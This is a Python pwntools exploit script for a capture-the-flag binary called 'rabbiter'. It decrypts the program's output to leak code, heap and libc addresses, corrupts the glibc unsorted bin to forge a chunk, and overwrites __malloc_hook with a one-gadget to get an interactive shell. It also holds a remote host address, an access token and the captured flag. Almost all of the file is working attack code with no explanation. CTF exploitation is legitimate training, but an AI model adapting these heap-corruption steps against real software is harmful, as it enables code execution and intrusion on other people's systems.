#!/usr/bin/env python
from pwn import *
context.arch = "amd64"

if "remote" in sys.argv:
    libc = ELF("./libc.so")
    r = remote("54.148.192.105", 7777)
    r.sendlineafter("Token:", "mEP6d1BeoEWizpISCDr80Jn5vj2HrGTy")
else:
    libc = ELF("../../libc.so.6")
    r = process("./rabbiter")

def New(buf1="", buf2="", num=0):
    r.sendline("1")
    r.send((buf1 + "\n")[:0x80])
    r.send((buf2 + "\n")[:0x180])
    r.sendline(str(num))
    r.recvuntil("VEW")
    r.recvline()
    size = len(buf1) - 1 + len(buf2) - 1 + 23 + len("%d" % num)
    log.info("Alloc @ " + r.recvline()[:-1] + ", size = " + hex(size))

def Edit(idx, buf):
    r.sendline("36854")
    r.sendline(str(idx))
    r.sendline(str(len(buf)))
    r.send(buf)

def View(idx):
    r.sendline("23")
    r.sendline(str(idx))
    return r.recvuntil("OVE\n", drop=True)

def Delete(idx):
    r.sendline("44")
    r.sendline(str(idx))

seed = [0] * 17
rotate = lambda v, b: (v >> (32 - b)) | (v << b)

def regen_seed():
    tmp = [seed[i + 8] for i in range(8)]
    seed[8] += seed[16] + 0x4D34D34D;
    seed[8] &= 0xffffffff
    seed[9] += (seed[8] < tmp[0]) - 0x2CB2CB2D;
    seed[9] &= 0xffffffff
    seed[10] += (seed[9] < tmp[1]) + 0x34D34D34;
    seed[10] &= 0xffffffff
    seed[11] += (seed[10] < tmp[2]) + 0x4D34D34D;
    seed[11] &= 0xffffffff
    seed[12] += (seed[11] < tmp[3]) - 0x2CB2CB2D;
    seed[12] &= 0xffffffff
    seed[13] += (seed[12] < tmp[4]) + 0x34D34D34;
    seed[13] &= 0xffffffff
    seed[14] += (seed[13] < tmp[5]) + 0x4D34D34D;
    seed[14] &= 0xffffffff
    seed[15] += (seed[14] < tmp[6]) - 0x2CB2CB2D;
    seed[15] &= 0xffffffff
    seed[16] = seed[15] < tmp[7];
    seed[16] &= 0xffffffff

    def q(x):
        var8 = x & 0xffff
        varC = x >> 16
        var10 = ((var8 * varC) + (var8 * var8 >> 17) >> 15) + (varC * varC)
        return (var10 ^ x * x) & 0xffffffff

    tmp2 = [q((seed[i + 8] + seed[i]) & 0xffffffff) for i in range(8)]

    v3 = tmp2[0]
    v4 = (rotate(tmp2[7], 16) + v3) & 0xffffffff
    v5 = rotate(tmp2[6], 16)
    seed[0] = v5 + v4

    v6 = tmp2[1]
    v7 = rotate(tmp2[0], 8)
    seed[1] = tmp2[7] + (v7 + v6) & 0xffffffff

    v8 = tmp2[2]
    v9 = (rotate(tmp2[1], 16) + v8) & 0xffffffff
    v10 = rotate(tmp2[0], 16)
    seed[2] = v10 + v9

    v11 = tmp2[3]
    v12 = rotate(tmp2[2], 8)
    seed[3] = tmp2[1] + (v12 + v11) & 0xffffffff

    v13 = tmp2[4]
    v14 = (rotate(tmp2[3], 16) + v13) & 0xffffffff
    v15 = rotate(tmp2[2], 16)
    seed[4] = v15 + v14

    v16 = tmp2[5]
    v17 = rotate(tmp2[4], 8)
    seed[5] = tmp2[3] + (v17 + v16) & 0xffffffff

    v18 = tmp2[6]
    v19 = (rotate(tmp2[5], 16) + v18) & 0xffffffff
    v20 = rotate(tmp2[4], 16)
    seed[6] = v20 + v19

    v21 = tmp2[7]
    v22 = rotate(tmp2[6], 8)
    seed[7] = tmp2[5] + (v22 + v21) & 0xffffffff

    for i in range(16):
	seed[i] &= 0xffffffff

def prepare_seed(name):
    name = name.ljust(16, "\0")
    u0 = u32(name[0:4])
    u1 = u32(name[4:8])
    u2 = u32(name[8:12])
    u3 = u32(name[12:16])
    seed[0] = u0
    seed[2] = u1
    seed[4] = u2
    seed[6] = u3
    seed[1] = (u2 >> 16) | (u3 << 16)
    seed[3] = (u3 >> 16) | (u0 << 16)
    seed[5] = (u0 >> 16) | (u1 << 16)
    seed[7] = (u1 >> 16) | (u2 << 16)
    seed[8] =  rotate(u2, 16)
    seed[10] = rotate(u3, 16)
    seed[12] = rotate(u0, 16)
    seed[14] = rotate(u1, 16)
    seed[9]  = (u1 & 0xffff) | u0 & 0xFFFF0000
    seed[11] = (u2 & 0xffff) | u1 & 0xFFFF0000
    seed[13] = (u3 & 0xffff) | u2 & 0xFFFF0000
    seed[15] = (u0 & 0xffff) | u3 & 0xFFFF0000
    seed[16] = 0

    for i in range(4):
        regen_seed()

    for i in range(8):
        seed[((i + 4) & 7) + 8] ^= seed[i]

def decrypt(cipher):
    cipher = cipher.ljust(align(16, len(cipher)), "\0")
    prepare_seed(name)
    plain = ""
    for i in range(0, len(cipher), 16):
        regen_seed()
        plain += p32((seed[3] << 16 & 0xffffffff) ^ (seed[5] >> 16) ^ (seed[0]) ^ u32(cipher[i     : i + 4 ]))
        plain += p32((seed[5] << 16 & 0xffffffff) ^ (seed[7] >> 16) ^ (seed[2]) ^ u32(cipher[i + 4 : i + 8 ]))
        plain += p32((seed[7] << 16 & 0xffffffff) ^ (seed[1] >> 16) ^ (seed[4]) ^ u32(cipher[i + 8 : i + 12]))
        plain += p32((seed[1] << 16 & 0xffffffff) ^ (seed[3] >> 16) ^ (seed[6]) ^ u32(cipher[i + 12: i + 16]))

    return plain

#name = randoms(4); print name
name = "egoe"

r.sendline(name)
r.recvlines(3)

# leak code base
New("A" * 0x80, "A" * 0x180, -1234567890)
leak = decrypt(View(0))[0x200:]
code_base = u64(leak[24:32]) - 0x37b5
log.info("code_base = " + hex(code_base))

# Fix top chunk
Edit(0, "A" * 0x200 + flat(0, 0x20df1))

# Create some freed chunk to leak libc base and heap base
New() # 1
New() # 2
New() # 3
New() # 4
Delete(3)
Delete(1)

leak = decrypt(View(0))[0x200:]
heap_base = u64(leak[16:24]) - 0x630
libc_base = u64(leak[24:32]) - 0x3c3b78
log.info("heap_base = " + hex(heap_base))
log.info("libc_base = " + hex(libc_base))

# create fake unsorted bin in the output buffer
fake_bin = decrypt("A" * (512-32) + flat(
        0, 0x211,    # prev size + size
        heap_base + 0x210,    # fd
        libc_base + 0x3c3b78, # bk
        0
    ))
assert("\n" not in fake_bin)
Edit(0, fake_bin)
View(0)

# current unsorted bins: libc<->+0x210<->+0x630<->libc

# overwrite +0x210 to corrupt unsorted bins
# unsorted bins: libc<- fake<->+0x210<->libc
#                              +0x210<- 0x630<->libc
fd = libc_base + 0x3c3b78
bk = code_base + 0x205a40 + (512-32) # our fake chunk in output buffer
Edit(0, "A" * 0x200 + flat(0, 0x211, fd, bk))

New() # 1, take +0x630
New() # 3, take +0x210
New("A" * 0x80, "A" * 0x180, -1234567890) # 5, get our fakechunk

# overwrite buf[0] with malloc_hook
Edit(5, "A" * 0x210 + p64(libc_base + libc.symbols["__malloc_hook"]))

# edit #0 to overwrite malloc_hook
Edit(0, p64(libc_base + 0x4526A))

# trigger malloc
r.sendline("1")

r.interactive()

# bctf{92a6a0c63e8e513e27a8d97da14e0ff8}
